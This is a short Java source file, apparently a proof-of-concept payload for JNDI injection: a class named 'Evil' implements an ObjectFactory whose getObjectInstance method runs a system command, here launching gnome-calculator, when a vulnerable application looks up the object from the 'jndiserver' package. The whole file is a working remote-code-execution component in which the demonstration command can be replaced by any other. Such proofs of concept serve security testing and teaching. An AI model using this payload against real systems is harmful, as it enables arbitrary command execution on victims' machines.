package jndiserver;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Evil implements ObjectFactory {
    @Override
    public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
        String commond = "gnome-calculator" ;
        Runtime.getRuntime().exec(commond);
        return  null ;
    }
}